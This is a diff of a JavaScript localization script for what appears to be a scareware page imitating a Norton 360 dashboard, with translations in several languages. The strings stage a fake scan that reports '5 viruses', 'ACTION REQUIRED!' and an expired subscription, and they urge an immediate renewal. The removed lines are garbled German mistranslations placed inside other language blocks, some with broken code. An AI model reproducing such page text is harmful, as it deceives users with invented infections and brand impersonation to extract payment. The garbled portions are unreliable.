+        document.getElementById("w4_5c").innerHTML = "Non disponible";
 
-document.getElementById("w4_7a").innerHTML = "Maßnahmen zur Bedrohungsabwehr Durchgeführt: 1";
+        document.getElementById("w4_5d").innerHTML = "Non disponible";
 
-document.getElementById("w4_7b").innerHTML = "Durchgeführte Maßnahmen zur Bedrohungsabwehr: 1";
+        document.getElementById("w4_6").innerHTML = "Activité";
 
-document.getElementById("w4_7c").innerHTML = "Durchgeführte Maßnahmen zur Bedrohungsabwehr: 1";
+        document.getElementById("w4_6a").innerHTML = "Activité";
 
-document.getElementById("w4_7d").innerHTML = "Durchgeführte Maßnahmen zur Bedrohungsabwehr: 1";
+        document.getElementById("w4_6b").innerHTML = "Activité";
 
-}
+        document.getElementById("w4_6c").innerHTML = "Activité";
 
-if (lang == "it") {
+        document.getElementById("w4_6d").innerHTML = "Activité";
 
-document.getElementById("menu").innerHTML = "PRODUKTE UND SERVICES SUPPORT KOSTENLOS TESTEN";
+        document.getElementById("w4_7").innerHTML = "Mesures anti-menace effectuées : 1";
 
-document.getElementById("menu_b").innerHTML = "Rechtliche Hinweise | Lizenzvertrag | Datenschutzinformationen | Nutzungsbedingungen | Cookies | Sitemap | Systemstatus"; 
+        document.getElementById("w4_7a").innerHTML = "Mesures anti-menace effectuées : 1";
 
-document.getElementById("head1").innerHTML = "Es werden nur wenige Informationen benötigt, wenn die
-se weiterentwickelt warden
-ute. Aber auch unsere Schutzsysteme.";
+        document.getElementById("w4_7b").innerHTML = "Mesures anti-menace effectuées : 1";
 
-document.getElementById("head2").innerHTML = "Norton 360. Umfassender Schutz für die Sicherheit Ihres Geräts; inklusive Virenschutz, VPN, Passwort-Manager und vielem mehr. Alles an einem Ort.";
+        document.getElementById("w4_7c").innerHTML = "Mesures anti-menace effectuées : 1";
 
-document.getElementById("w1_ico1").style.right = "157px";
+        document.getElementById("w4_7d").innerHTML = "Mesures anti-menace effectuées : 1";
 
-document.getElementById("w1_1").style.right = "85px";
+    }
 
-document.getElementById("w1_ico2").style.right = "55px";
 
-document.getElementById("w1_1").innerHTML = "Einstellungen";
 
-document.getElementById("w1_2").innerHTML = "Hilfe";
+    if (lang == "it") {
 
-document.getElementById("w1_3").innerHTML = "Ihr Gerät ist geschützt";
+        document.getElementById("menu").innerHTML = "PRODOTTI E SERVIZI &nbsp&nbsp&nbsp SUPPORTO &nbsp&nbsp&nbsp PROVE GRATUITE";
 
-document.getElementById("w1_4").innerHTML = "Schutz-Updates:";
+        document.getElementById("menu_b").innerHTML = "Note legali | Contratto di licenza | Informativa sulla privacy | Opportunità di lavoro | Cookie | Indice del sito | Stato del sistema";
 
-document.getElementById("w1_5").innerHTML = "Aktuell";
+        document.getElementById("head1").innerHTML = "Le minacce informatiche si sono evolute. Ma anche i nostri sistemi di protezione.";
 
-document.getElementById("w1_6").innerHTML = "Letzter Scan: ";
+        document.getElementById("head2").innerHTML = "Norton 360. Protezione completa per la sicurezza del tuo dispositivo; include antivirus, VPN, Password Manager e molto altro ancora. Tutto in un’unica soluzione.";
 
-document.getElementById("w1_7").innerHTML = "Nicht verfügbar";
+        document.getElementById("w1_ico1").style.right = "157px";
 
-document.getElementById("w1_8").innerHTML = "| Schnellscan";
+        document.getElementById("w1_1").style.right = "85px";
 
-document.getElementById("w1_9").innerHTML = "Verwendete Lizenzen: ";
+        document.getElementById("w1_ico2").style.right = "55px";
 
-document.getElementById("w1_10").innerHTML = "1 von 5";
+        document.getElementById("w1_1").innerHTML = "Impostazioni";
 
-document.getElementById("w1_11").innerHTML = "| Auf einem anderen Gerät installieren";
+        document.getElementById("w1_2").innerHTML = "Guida";
 
-document.getElementById("w1_12").innerHTML = "Sicherheit";
+        document.getElementById("w1_3").innerHTML = "Il dispositivo è protetto";
 
-document.getElementById("w1_13").innerHTML = "Geschützt";
+        document.getElementById("w1_4").innerHTML = "Aggiornamenti sulla protezione: ";
 
-document.getElementById("w1_14").innerHTML = "Identität";
+        document.getElementById("w1_5").innerHTML = "Attuale";
 
-document.getElementById("w1_13a").innerHTML = "Geschützt";
+        document.getElementById("w1_6").innerHTML = "Ultima scansione: ";
 
-document.getElementById("w1_15").innerHTML = "Leistung";
+        document.getElementById("w1_7").innerHTML = "Non disponibile";
 
-document.getElementById("w1_13b").innerHTML = "Geschützt";
+        document.getElementById("w1_8").innerHTML = "| Scansione rapida";
 
-document.getElementById("w1_16").innerHTML = "Mehr von Norton";
+        document.getElementById("w1_9").innerHTML = "Licenze utilizzate: ";
 
-document.getElementById("w1_13c").innerHTML = "Geschützt";
+        document.getElementById("w1_10").innerHTML = "1 di 5";
 
-document.getElementById("w1_17").innerHTML = "ABONNEMENTSTATUS:";
+        document.getElementById("w1_11").innerHTML = "| Installa su un altro dispositivo";
 
-document.getElementById("w1_18").innerHTML = "Noch 30 Tage";
+        document.getElementById("w1_12").innerHTML = "Sicurezza";
 
-document.getElementById("w2_1").innerHTML = "Schnellscan";
+        document.getElementById("w1_13").innerHTML = "Protetto";
 
-document.getElementById("w2_2").innerHTML = "Wird ausgeführt";
+        document.getElementById("w1_14").innerHTML = "Identità";
 
-document.getElementById("w2_3").innerHTML = "Häufig infizierte Bereiche und Startdateien werden gescannt...";
+        document.getElementById("w1_13a").innerHTML = "Protetto";
 
-document.getElementById("w2_4").innerHTML = "Wird ausgeführt";
+        document.getElementById("w1_15").innerHTML = "Prestazioni";
 
-document.getElementById("w2_5").innerHTML = "Häufig infizierte Bereiche und Startdateien werden gescannt Dateien...";
+        document.getElementById("w1_13b").innerHTML = "Protetto";
 
-document.getElementById("w2_6").innerHTML = "Zusammenfassung der Ergebnisse:";
+        document.getElementById("w1_16").innerHTML = "Altro di Norton";
 
-document.getElementById("w2_7").innerHTML = "[+] Gesamtzahl der gescannten Elemente:";
+        document.getElementById("w1_13c").innerHTML = "Protetto";
 
-document.getElementById("w2_8").innerHTML = "[+] Gesamtzahl der erkannten Sicherheitsbedrohungen:";
+        document.getElementById("w1_17").innerHTML = "STATO DELLA SOTTOSCRIZIONE: ";
 
-document.getElementById("w2_9").innerHTML = "[+] Gesamtzahl der behobenen Sicherheitsbedrohungen:";
+        document.getElementById("w1_18").innerHTML = "30 giorni rimanenti";
 
-document.getElementById("w2_10").innerHTML = "Gesamtzahl der Sicherheitsbedrohungen, die Maßnahmen erfordern:";
+        document.getElementById("w2_1").innerHTML = "Scansione rapida";
 
-document.getElementById("w2_11").innerHTML = "Pause";
+        document.getElementById("w2_2").innerHTML = "In esecuzione";
 
-document.getElementById("w2_12").innerHTML = "Stopp";
+        document.getElementById("w2_3").innerHTML = "Scansione delle aree comunemente infette e dei file di avvio...";
 
-document.getElementById("w3_1").innerHTML = "Ihr PC hat 5 Viren!";
+        document.getElementById("w2_4").innerHTML = "In esecuzione";
 
-document.getElementById("w3_2").innerHTML = "AKTION ERFORDERLICH!";
+        document.getElementById("w2_5").innerHTML = "Scansione delle aree comunemente infette e dei file di avvio...";
 
-document.getElementById("w3_3").innerHTML = "Ihr Norton-Abonnement ist abgelaufen!";
+        document.getElementById("w2_6").innerHTML = "Riepilogo risultati:";
 
-document.getElementById("w3_4").innerHTML = "Verlängern Sie es jetzt, um Ihren PC zu schützen.";
+        document.getElementById("w2_7").innerHTML = "[+] Totale elementi scansionati:";
 
-document.getElementById("w3_5").innerHTML = "Ein ungeschützter PC ist dem Risiko von Viren und anderer Malware ausgesetzt.";
+        document.getElementById("w2_8").innerHTML = "[+] Totale minacce per la sicurezza rilevate:";
 
-document.getElementById("w3_6").innerHTML = "Fortfahren...";
+        document.getElementById("w2_9").innerHTML = "[+] Totale minacce per la sicurezza risolte:";
 
-document.getElementById("w4_1").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w2_10").innerHTML = "Totale minacce per la sicurezza che richiedono interventi:";
 
-document.getElementById("w4_1a").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w2_11").innerHTML = "Pausa";
 
-document.getElementById("w4_1b").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w2_12").innerHTML = "Interrompi";
 
-document.getElementById("w4_1c").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_1").innerHTML = "Il PC contiene 5 virus!";
 
-document.getElementById("w4_1d").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_2").innerHTML = "INTERVENTO NECESSARIO!";
 
-document.getElementById("w4_2").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_3").innerHTML = "La tua sottoscrizione a Norton è scaduta!";
 
-document.getElementById("w4_2a").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_4").innerHTML = "Rinnovala ora per mantenere il PC al sicuro.";
 
-document.getElementById("w4_2b").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_5").innerHTML = "Un PC non protetto è esposto al rischio di virus e altri malware.";
 
-document.getElementById("w4_2c").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_6").innerHTML = "Continua...";
 
-document.getElementById("w4_3").innerHTML = "Mittel Risiko";
+        document.getElementById("w4_1").innerHTML = "Minaccia rilevata!";
 
-document.getElementById("w4_4").innerHTML = "Quelle";
+        document.getElementById("w4_1a").innerHTML = "Minaccia rilevata!";
 
-document.getElementById("w4_4a").innerHTML = "Quelle";
+        document.getElementById("w4_1b").innerHTML = "Minaccia rilevata!";
 
-document.getElementById("w4_4b").innerHTML = "Quelle";
+        document.getElementById("w4_1c").innerHTML = "Minaccia rilevata!";
 
-document.getElementById("w4_4c").innerHTML = "Quelle";
+        document.getElementById("w4_1d").innerHTML = "Minaccia rilevata!";
 
-document.getElementById("w4_4d").innerHTML = "Quelle";
+        document.getElementById("w4_2").innerHTML = "Rischio elevato";
 
-document.getElementById("w4_5").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_2a").innerHTML = "Rischio elevato";
 
-document.getElementById("w4_5a").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_2b").innerHTML = "Rischio elevato";
 
-document.getElementById("w4_5b").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_2c").innerHTML = "Rischio elevato";
 
-document.getElementById("w4_5c").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_3").innerHTML = "Rischio medio";
 
-document.getElementById("w4_5d
-").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_4").innerHTML = "Origine";
 
-document.getElementById("w4_6").innerHTML = "Aktivität";
+        document.getElementById("w4_4a").innerHTML = "Origine";
 
-document.getElementById("w4_6a").innerHTML = "Aktivität";
+        document.getElementById("w4_4b").innerHTML = "Origine";
 
-document.getElementById("w4_6b").innerHTML = "Aktivität";
+        document.getElementById("w4_4c").innerHTML = "Origine";
 
-document.getElementById("w4_6c").innerHTML = "Aktivität";
+        document.getElementById("w4_4d").innerHTML = "Origine";
 
-document.getElementById("w4_6d").innerHTML = "Aktivität";
+        document.getElementById("w4_5").innerHTML = "Non disponibile";
 
-document.getElementById("w4_7").innerHTML = "Ausgeführte Bedrohungsbehebungen: 1";
+        document.getElementById("w4_5a").innerHTML = "Non disponibile";
 
-document.getElementById("w4_7a").innerHTML = "Ausgeführte Bedrohungsbehebungen: 1";
+        document.getElementById("w4_5b").innerHTML = "Non disponibile";
 
-document.getElementById("w4_7b").innerHTML = "Behebungen Ausgeführt: 1";
+        document.getElementById("w4_5c").innerHTML = "Non disponibile";
 
-document.getElementById("w4_7c").innerHTML = "Ausgeführte Bedrohungskorrekturen: 1";
+        document.getElementById("w4_5d").innerHTML = "Non disponibile";
 
-document.getElementById("w4_7d").innerHTML = "Ausgeführte Bedrohungskorrekturen: 1";
+        document.getElementById("w4_6").innerHTML = "Attività";
 
-}
+        document.getElementById("w4_6a").innerHTML = "Attività";
 
+        document.getElementById("w4_6b").innerHTML = "Attività";
 
+        document.getElementById("w4_6c").innerHTML = "Attività";
 
-if (lang == "el") {
+        document.getElementById("w4_6d").innerHTML = "Attività";
 
-document.getElementById("menu").innerHTML = "ΠΡΟΪΟΝΤΑ ΚΑΙ ΥΠΗΡΕΣΙΕΣ &nbsp&nbsp&nbsp ΥΠΟΣΤΗΡΙΞ&nbsp&nbsp&nbsp&nbsp ΔΩΡΕΑΝ ΔΟΚΙΜΑΣΤΙΚΕΣ ΕΚΔΟΣΕΙΣ“;
+        document.getElementById("w4_7").innerHTML = "Correzioni delle minacce eseguite: 1";
 
-document.getElementById("menu_b").innerHTML = "Neue Version | Neue Version | Neue Version προσωπικών δεδομένων | Κατάσταση συστήματος“;
+        document.getElementById("w4_7a").innerHTML = "Correzioni delle minacce eseguite: 1";
 
-document.getElementById("head1").innerHTML = "Dieses Dokument ist nicht verfügbar. συμβαίνει και με την προστασία μας.“;
+        document.getElementById("w4_7b").innerHTML = "Correzioni delle minacce eseguite: 1";
 
-document.getElementById("head2").innerHTML =
+        document.getElementById("w4_7c").innerHTML = "Correzioni delle minacce eseguite: 1";
 
-„Norton 360. Weitere Informationen finden Sie auf Seite VPN, VPN, Das bedeutet, dass Sie Ihre Daten nicht in die richtige Richtung lenken können λύση.“; 
+        document.getElementById("w4_7d").innerHTML = "Correzioni delle minacce eseguite: 1";
 
-}
+    }
 
 
 
-if (lang == "pt") {
+    if (lang == "el") {
 
-document.getElementById("menu").innerHTML = "PRODUKTE UND DIENSTLEISTUNGEN &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp KOSTENLOSER VERSAND"; 
+        document.getElementById("menu").innerHTML = "ΠΡΟΪΟΝΤΑ ΚΑΙ ΥΠΗΡΕΣΙΕΣ &nbsp&nbsp&nbsp ΥΠΟΣΤΗΡΙΞΗ &nbsp&nbsp&nbsp ΔΩΡΕΑΝ ΔΟΚΙΜΑΣΤΙΚΕΣ ΕΚΔΟΣΕΙΣ";
 
-document.getElementById("menu_b").innerHTML = Impressum | Lizenzvereinbarung | Datenschutzrichtlinie | Karriere | Cookies | Sitemap | Systemstatus
+        document.getElementById("menu_b").innerHTML = "Νομική σημείωση | Άδεια χρήσης | Πολιτική προστασίας προσωπικών δεδομένων | Ευκαιρίες καριέρας | Cookie | Χάρτης τοποθεσίας | Κατάσταση συστήματος";
 
-document.getElementById("head1").innerHTML = "Die Cyberbedrohungen haben sich weiterentwickelt. Unser Schutz auch."
+        document.getElementById("head1").innerHTML = "Οι απειλές του κυβερνοχώρου έχουν εξελιχθεί. Το ίδιο συμβαίνει και με την προστασία μας.";
 
-document.getElementById("head2").innerHTML = "Norton 360. Umfassender Schutz mit Gerätesicherheit, inklusive Virenschutz, VPN, Passwort-Manager und vielem mehr. Alles in einer Lösung.";
+        document.getElementById("head2").innerHTML =
 
-document.getElementById("w1_ico1").style.right = "165px";
+            "Norton 360. Ολοκληρωμένη προστασία με ασφάλεια συσκευής που περιλαμβάνει λογισμικό προστασίας από ιούς, VPN, ένα πρόγραμμα διαχείρισης κωδικών πρόσβασης και πολλά άλλα. Όλα σε μία μόνο λύση.";
 
-document.getElementById("w1_1").style.right = "85px";
+    }
 
-document.getElementById("w1_ico2").style.right = "55px";
 
-document.getElementById("w1_1").innerHTML = "Einstellungen";
 
-document.getElementById("w1_2").innerHTML = "Hilfe";
+    if (lang == "pt") {
 
-document.getElementById("w1_3").innerHTML = "Sie sind geschützt";
+        document.getElementById("menu").innerHTML = "PRODUTOS E SERVIÇOS &nbsp&nbsp&nbsp SUPORTE &nbsp&nbsp&nbsp AVALIAÇÕES GRATUITAS";
 
-document.getElementById("w1_4").innerHTML = "Sicherheitsupdates:";
+        document.getElementById("menu_b").innerHTML = "Aviso Legal | Contrato de Licença | Política de Privacidade | Carreiras | Cookies | Mapa do Site | Estado do Sistema";
 
-document.getElementById("w1_5").innerHTML = "Aktuell";
+        document.getElementById("head1").innerHTML = "As ciberameaças evoluíram. A nossa proteção também.";
 
-document.getElementById("w1_6").innerHTML = "Letzte Überprüfung: ";
+        document.getElementById("head2").innerHTML = "Norton 360. Proteção abrangente com segurança do dispositivo, incluindo antivírus, além de uma VPN, um gestor de palavras-passe e muito mais. Tudo numa única solução.";
 
-document.getElementById("w1_7").innerHTML = "Nicht verfügbar";
+        document.getElementById("w1_ico1").style.right = "165px";
 
-document.getElementById("w1_8").innerHTML = "| Schnellprüfung";
+        document.getElementById("w1_1").style.right = "85px";
 
-document.getElementById("w1_9").innerHTML = "Verwendete Lizenzen: ";
+        document.getElementById("w1_ico2").style.right = "55px";
 
-document.getElementById("w1_10").innerHTML = "1 von 5";
+        document.getElementById("w1_1").innerHTML = "Configurações";
 
-document.getElementById("w1_11").innerHTML = "| Auf einem anderen Gerät installieren";
+        document.getElementById("w1_2").innerHTML = "Ajuda";
 
-document.getElementById("w1_12").innerHTML = "Sicherheit";
+        document.getElementById("w1_3").innerHTML = "Você está protegido";
 
-document.getElementById("w1_13").innerHTML = "Geschützt";
+        document.getElementById("w1_4").innerHTML = "Atualizações de segurança: ";
 
-document.getElementById("w1_14").innerHTML = "Identität";
+        document.getElementById("w1_5").innerHTML = "Atual";
 
-document.getElementById("w1_13a").innerHTML = "Geschützt";
+        document.getElementById("w1_6").innerHTML = "Última verificação: ";
 
-document.getElementById("w1_15").innerHTML = "Leistung";
+        document.getElementById("w1_7").innerHTML = "Não disponível";
 
-document.getElementById("w1_13b").innerHTML = "Geschützt";
+        document.getElementById("w1_8").innerHTML = "| Verificação rápida";
 
-document.getElementById("w1_16").innerHTML = "Mais Norton";
+        document.getElementById("w1_9").innerHTML = "Licenças usadas: ";
 
-document.getElementById("w1_13c").innerHTML = "Geschützt";
+        document.getElementById("w1_10").innerHTML = "1 de 5";
 
-document.getElementById("w1_17").innerHTML = "SIGNATURSTATUS: ";
+        document.getElementById("w1_11").innerHTML = "| Instalar em outro dispositivo";
 
-document.getElementById("w1_18").innerHTML = "Faltam 30 dias";
+        document.getElementById("w1_12").innerHTML = "Segurança";
 
-document.getElementById("w2_1").innerHTML = "Schnellprüfung";
+        document.getElementById("w1_13").innerHTML = "Protegido";
 
-document.getElementById("w2_2").innerHTML = "Wird ausgeführt";
+        document.getElementById("w1_14").innerHTML = "Identidade";
 
-document.getElementById("w2_3").innerHTML = "Wird auf häufig infizierte Bereiche und Initialisierungsdateien geprüft...";
+        document.getElementById("w1_13a").innerHTML = "Protegido";
 
-document.getElementById("w2_4").innerHTML = "Wird ausgeführt";
+        document.getElementById("w1_15").innerHTML = "Performance";
 
-document.getElementById("w2_5").innerHTML = "Wird auf häufig infizierte Bereiche und Initialisierungsdateien geprüft...";
+        document.getElementById("w1_13b").innerHTML = "Protegido";
 
-document.getElementById("w2_6").innerHTML = "Zusammenfassung der Ergebnisse";
+        document.getElementById("w1_16").innerHTML = "Mais Norton";
 
-document.getElementById("w2_7").innerHTML = "[+] Gesamtzahl der verifizierten Elemente:";
+        document.getElementById("w1_13c").innerHTML = "Protegido";
 
-document.getElementById("w2_8").innerHTML = "[+] Gesamtzahl der erkannten Sicherheitsrisiken:";
+        document.getElementById("w1_17").innerHTML = "STATUS DA ASSINATURA: ";
 
-document.getElementById("w2_9").innerHTML = "[+] Gesamtzahl der behobenen Sicherheitsrisiken:";
+        document.getElementById("w1_18").innerHTML = "Faltam 30 dias";
 
-document.getElementById("w2_10").innerHTML = "Gesamtzahl der Sicherheitsrisiken, die behoben werden müssen:";
+        document.getElementById("w2_1").innerHTML = "Verificação rápida";
 
-document.getElementById("w2_11").in
-erHTML = "Pause";
+        document.getElementById("w2_2").innerHTML = "Trabalhando";
 
-document.getElementById("w2_12").innerHTML = "Stopp";
+        document.getElementById("w2_3").innerHTML = "Verificando áreas frequentemente infectadas e arquivos de inicialização...";
 
-document.getElementById("w3_1").innerHTML = "Ihr PC ist mit 5 Viren infiziert!";
+        document.getElementById("w2_4").innerHTML = "Trabalhando";
 
-document.getElementById("w3_2").innerHTML = "AKTION ERFORDERLICH!";
+        document.getElementById("w2_5").innerHTML = "Verificando áreas frequentemente infectadas e arquivos de inicialização...";
 
-document.getElementById("w3_3").innerHTML = "Ihr Norton-Abonnement ist abgelaufen!";
+        document.getElementById("w2_6").innerHTML = "Resumo dos resultados";
 
-document.getElementById("w3_4").innerHTML = "Jetzt verlängern, um Ihren PC zu schützen!";
+        document.getElementById("w2_7").innerHTML = "[+] Total de itens verificados:";
 
-document.getElementById("w3_5").innerHTML = "Wenn Ihr PC ungeschützt ist, besteht das Risiko, dass er sich Viren und andere Malware einfängt.";
+        document.getElementById("w2_8").innerHTML = "[+] Total de riscos de segurança detectados:";
 
-document.getElementById("w3_6").innerHTML = "Fortfahren...";
+        document.getElementById("w2_9").innerHTML = "[+] Total de riscos de segurança resolvidos:";
 
-document.getElementById("w4_1").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w2_10").innerHTML = "Total de riscos de segurança que requerem atenção:";
 
-document.getElementById("w4_1a").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w2_11").innerHTML = "Pausar";
 
-document.getElementById("w4_1b").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w2_12").innerHTML = "Parar";
 
-document.getElementById("w4_1c").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_1").innerHTML = "Seu PC está infectado com 5 vírus!";
 
-document.getElementById("w4_1d").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_2").innerHTML = "AÇÃO NECESSÁRIA!";
 
-document.getElementById("w4_2").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_3").innerHTML = "Sua assinatura do Norton expirou!";
 
-document.getElementById("w4_2a").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_4").innerHTML = "Renove agora para manter seu PC protegido!";
 
-document.getElementById("w4_2b").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_5").innerHTML = "Se o seu PC estiver desprotegido, ele corre risco de pegar vírus e outros malwares.";
 
-document.getElementById("w4_2c").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_6").innerHTML = "Continuar...";
 
-document.getElementById("w4_3").innerHTML = "Mittleres Risiko";
+        document.getElementById("w4_1").innerHTML = "Ameaça detectada!";
 
-document.getElementById("w4_4").innerHTML = "Quelle";
+        document.getElementById("w4_1a").innerHTML = "Ameaça detectada!";
 
-document.getElementById("w4_4a").innerHTML = "Quelle";
+        document.getElementById("w4_1b").innerHTML = "Ameaça detectada!";
 
-document.getElementById("w4_4b").innerHTML = "Quelle";
+        document.getElementById("w4_1c").innerHTML = "Ameaça detectada!";
 
-document.getElementById("w4_4c").innerHTML = "Quelle";
+        document.getElementById("w4_1d").innerHTML = "Ameaça detectada!";
 
-document.getElementById("w4_4d").innerHTML = "Quelle";
+        document.getElementById("w4_2").innerHTML = "Alto risco";
 
-document.getElementById("w4_5").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_2a").innerHTML = "Alto risco";
 
-document.getElementById("w4_5a").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_2b").innerHTML = "Alto risco";
 
-document.getElementById("w4_5b").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_2c").innerHTML = "Alto risco";
 
-document.getElementById("w4_5c").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_3").innerHTML = "Risco médio";
 
-document.getElementById("w4_5d").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_4").innerHTML = "Origem";
 
-document.getElementById("w4_6").innerHTML = "Aktivität";
+        document.getElementById("w4_4a").innerHTML = "Origem";
 
-document.getElementById("w4_6a").innerHTML = "Aktivität";
+        document.getElementById("w4_4b").innerHTML = "Origem";
 
-document.getElementById("w4_6b").innerHTML = "Aktivität";
+        document.getElementById("w4_4c").innerHTML = "Origem";
 
-document.getElementById("w4_6c").innerHTML = "Aktivität";
+        document.getElementById("w4_4d").innerHTML = "Origem";
 
-document.getElementById("w4_6d").innerHTML = "Aktivität";
+        document.getElementById("w4_5").innerHTML = "Não disponível";
 
-document.getElementById("w4_7").innerHTML = "Gegen Bedrohungen ergriffene Maßnahmen: 1";
+        document.getElementById("w4_5a").innerHTML = "Não disponível";
 
-document.getElementById("w4_7a").innerHTML = "Gegen Bedrohungen ergriffene Maßnahmen: 1";
+        document.getElementById("w4_5b").innerHTML = "Não disponível";
 
-document.getElementById("w4_7b").innerHTML = "Gegen Bedrohungen ergriffene Maßnahmen: 1";
+        document.getElementById("w4_5c").innerHTML = "Não disponível";
 
-document.getElementById("w4_7c").innerHTML = "Gegen Bedrohungen ergriffene Maßnahmen: 1";
+        document.getElementById("w4_5d").innerHTML = "Não disponível";
 
-document.getElementById("w4_7d").innerHTML = "Gegen Bedrohungen ergriffene Maßnahmen: 1";
+        document.getElementById("w4_6").innerHTML = "Atividade";
 
-}
+        document.getElementById("w4_6a").innerHTML = "Atividade";
 
+        document.getElementById("w4_6b").innerHTML = "Atividade";
 
+        document.getElementById("w4_6c").innerHTML = "Atividade";
 
-if (lang == "pl") {
+        document.getElementById("w4_6d").innerHTML = "Atividade";
 
-document.getElementById("menu").innerHTML = "PRODUKTE I USŁUGI &nbsp&nbsp&nbsp POMOC &nbsp&nbsp&nbsp BEZPŁATNE WERSJE PROBNE"; 
+        document.getElementById("w4_7").innerHTML = "Ações realizadas contra ameaças: 1";
 
-document.getElementById("menu_b").innerHTML = "Informationen zur Information | Lizenzierung | Weitere Informationen zu den Cookies | Praca | Pliki Cookie | Karte anzeigen | Standardsystem"; 
+        document.getElementById("w4_7a").innerHTML = "Ações realizadas contra ameaças: 1";
 
-document.getElementById("head1").innerHTML = "Zagrożenia sieciowe ewoluowały. Nasza ochrona również."; 
+        document.getElementById("w4_7b").innerHTML = "Ações realizadas contra ameaças: 1";
 
-document.getElementById("head2").innerHTML = "Norton 360. Neue Version, mit Anti-Wire-Funktion, VPN-Funktion, nicht mehr verfügbar. Integriertes Netzwerk."; 
+        document.getElementById("w4_7c").innerHTML = "Ações realizadas contra ameaças: 1";
 
-}
+        document.getElementById("w4_7d").innerHTML = "Ações realizadas contra ameaças: 1";
 
+    }
 
 
-if (lang == "nl") {
 
-document.getElementById("menu").innerHTML = "PRODUKTE UND DIENSTLEISTUNGEN &nbsp&nbsp&nbsp UNTERSTÜTZUNG &nbsp&nbsp&nbsp KOSTENLOSE PROEFVERSIES"; 
+    if (lang == "pl") {
 
-document.getElementById("menu_b").innerHTML = "Rechtliche Informationen | Lizenzvereinbarung | Datenschutzbestimmungen | Cookies | Site-Index | RSS | Systemstatus"; 
+        document.getElementById("menu").innerHTML = "PRODUKTY I USŁUGI &nbsp&nbsp&nbsp POMOC &nbsp&nbsp&nbsp BEZPŁATNE WERSJE PRÓBNE";
 
-document.getElementById("head1").innerHTML = "Cyberserver werden nicht genutzt. Es wird auch auf diese Weise geschützt."; 
+        document.getElementById("menu_b").innerHTML = "Informacje prawne | Umowa licencyjna | Zasady ochrony danych osobowych | Praca | Pliki cookie | Mapa witryny | Stan systemu";
 
-document.getElementById("head2").innerHTML = "Neues Norton 360. Sicherheitsschutz mit Sicherheitsschutz, Antivirenprogramm, VPN, Sicherheitsüberwachung und mehr. Alle Dateien sind nicht verfügbar."; 
+        document.getElementById("head1").innerHTML = "Zagrożenia sieciowe ewoluowały. Nasza ochrona również.";
 
-}
+        document.getElementById("head2").innerHTML = "Norton 360. Kompleksowa ochrona urządzeń, w tym antywirus, sieć VPN, menedżer haseł i nie tylko. Zintegrowane rozwiązanie.";
 
+    }
 
 
-if (lang == "sv") {
 
-document.getElementById("menu").innerHTML = "PRODUKTE UND TJÄNSTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp PROVA UTAN KOSTNAD"; 
+    if (lang == "nl") {
 
-document.getElementById("menu_b").innerHTML = "Rechtliche Hinweise | Lizenzierung | Sicherheitsrichtlinien | Benutzeroberfläche | Cookies | Webbrowser | Systemstatus"; 
+        document.getElementById("menu").innerHTML = "PRODUCTEN EN SERVICES &nbsp&nbsp&nbsp ONDERSTEUNING &nbsp&nbsp&nbsp GRATIS PROEFVERSIES";
 
-document.getElementById("head1").innerHTML = "Hot Internet hat Zugriffe. Es ist ein Skydd-Code."; 
+        document.getElementById("menu_b").innerHTML = "Juridische informatie | Licentieovereenkomst | Privacybeleid | Cookies | Site-index | RSS | Systeemstatus";
 
-document.getElementById("head2").innerHTML = "Norton 360. Skydd-Unterstützung für digitales Internet, einschließlich Antivirus und VPN, und nicht mehr verfügbar. Alles und nichts."; 
+        document.getElementById("head1").innerHTML = "Cyberbedreigingen zijn geëvolueerd. En daarmee ook onze bescherming.";
 
-}
+        document.getElementById("head2").innerHTML = "NIEUWE Norton 360. Uitgebreide bescherming met apparaatbeveiliging waaronder antivirus, een VPN, wachtwoordbeheer en meer. Allemaal in één oplossing.";
 
+    }
 
 
-if (lang == "tr") {
 
-document.getElementById("menu").innerHTML = "ÜRÜNLER VE HİZMETLER &nbsp&nbsp&nbsp DESTEK &nbsp&nbsp&nbsp ÜCRETSİZ DENEME"; 
+    if (lang == "sv") {
 
-Dokument.g
-etElementById("menu_b").innerHTML = "Yasal Bildirim | Lisans Sözleşmesi | Gizlilik İlkesi | Kariyer | Tanımlama Bilgileri | Site Haritası | Sistem Durumu";
+        document.getElementById("menu").innerHTML = "PRODUKTER OCH TJÄNSTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp PROVA UTAN KOSTNAD";
 
-document.getElementById("head1").innerHTML = "Der Inhalt wird gelöscht. Der Inhalt wird gelöscht.";
+        document.getElementById("menu_b").innerHTML = "Juridiskt meddelande | Licensavtal | Sekretesspolicy | Lediga tjänster | Cookies | Webbplatsöversikt | Systemstatus";
 
-document.getElementById("head2").innerHTML = "Norton 360.
+        document.getElementById("head1").innerHTML = "Hot på internet har utvecklats. Det har vårt skydd också.";
 
-}
+        document.getElementById("head2").innerHTML = "Norton 360. Omfattande skydd med säkerhet för digitala enheter inklusive antivirus, plus VPN, en lösenordshanterare med mera. Allt i en enda lösning.";
 
-if (lang == "ja") {
+    }
